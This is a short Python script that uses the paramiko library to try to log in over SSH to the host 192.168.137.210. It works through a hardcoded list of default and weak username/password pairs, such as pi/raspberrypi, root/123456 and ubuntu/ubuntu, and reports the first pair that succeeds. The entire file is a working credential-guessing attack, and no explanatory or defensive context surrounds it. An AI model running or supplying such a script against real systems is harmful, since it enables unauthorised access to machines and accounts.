import paramiko

def try_ssh(ip, username, password):
    client = paramiko.SSHClient()
    client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
    try:
        client.connect(ip, username=username, password=password, timeout=2)
        print(f"Success: {username}:{password}")
        return True
    except:
        return False
    finally:
        client.close()

ip = '192.168.137.210'
creds = [('ubuntu', 'ubuntu'), ('pi', '123456'), ('pi', 'raspberrypi'), ('pi', 'root'), ('root', '123456'), ('qpeix', '123456'), ('pi', '12345678')]

for u, p in creds:
    if try_ssh(ip, u, p):
        break
